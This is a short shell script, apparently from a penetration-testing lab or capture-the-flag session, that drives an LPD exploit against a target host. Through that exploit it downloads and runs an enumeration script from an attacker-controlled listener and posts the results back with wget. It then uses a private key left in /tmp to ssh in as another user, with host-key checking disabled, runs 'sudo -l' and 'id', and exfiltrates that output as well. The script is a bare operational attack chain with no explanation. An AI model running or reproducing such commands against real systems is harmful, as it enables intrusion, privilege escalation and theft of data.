#!/bin/sh
# Run archivist_root_enum on target; try ssh archivist if key exists
TARGET="${1:-10.129.41.175}"
LH="${LHOST:-10.10.17.138}"
DIR="$(dirname "$0")"
# as lp: fetch and run
python3 "$DIR/lpd_exploit.py" "$TARGET" -c "wget -qO /tmp/ar.py http://${LH}:8765/archivist_root_enum.py; python3 /tmp/ar.py > /tmp/.p 2>&1; wget -qO- --post-file=/tmp/.p http://${LH}:8900/rootenum 2>/dev/null"
# optional: archivist ssh one-liner if key on target
python3 "$DIR/lpd_exploit.py" "$TARGET" -c "test -r /tmp/id_ed25519 && ssh -o BatchMode=yes -o StrictHostKeyChecking=no -i /tmp/id_ed25519 archivist@127.0.0.1 'sudo -l; id' > /tmp/.p 2>&1; wget -qO- --post-file=/tmp/.p http://${LH}:8900/archsh 2>/dev/null || true"